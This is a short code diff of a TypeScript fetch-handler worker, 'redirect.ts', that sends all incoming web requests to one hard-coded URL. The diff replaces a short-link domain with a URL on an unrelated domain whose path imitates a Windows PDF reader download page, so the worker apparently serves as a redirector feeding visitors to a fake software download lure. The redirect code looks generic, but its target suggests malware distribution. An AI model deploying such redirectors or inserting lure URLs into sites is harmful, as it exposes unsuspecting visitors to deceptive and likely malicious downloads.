@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://netvigatol.com/JFyHyfNR"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://michoo-china.com/reader-download-os-Windows-10name-Reader/"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
